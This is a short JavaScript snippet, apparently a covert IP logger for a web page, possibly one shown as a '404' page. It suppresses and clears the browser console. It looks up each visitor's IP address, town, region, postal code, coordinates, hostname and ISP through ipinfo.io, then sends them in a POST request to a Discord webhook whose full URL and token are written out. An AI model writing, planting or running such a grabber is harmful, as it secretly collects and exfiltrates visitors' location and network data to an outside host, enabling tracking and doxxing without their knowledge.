console.log = function() {}
$.getJSON("https://ipinfo.io/json", function(data) {         
  var params = {
    embeds: [
      {
        "title": "Logged someone who have 404 BUG",
        "color": 12846084,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "IP Address",
            "value": `> ${data.ip}`
          },
          {
            "name": "GeoLocation Info",
            "value": `>>> Town, State: ${data.city}, ${data.region}"\n"Country: ${data.country}"\n"Postal Code: ${data.postal}"\n"TimeZone: ${(data.timezone).replace('_', ' ')}"\n"Long/Lat: ${data.loc}`
          },
          {
            "name": "Network Info",
            "value": `>>> HostName: ${data.hostname}"\n"ISP: ${data.org}"\n"`
          }
        ]
      }
    ]
  }
  fetch('https://discord.com/api/webhooks/1043270639009677312/utmfK8MDzBx-3gQZfPcRxPYUjVvMuw5LcOuNYnCo6hbGmstVO6TJWpfH3A9B0sD8_MkR', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
    console.log("hi");
console.clear();
  }) 
})
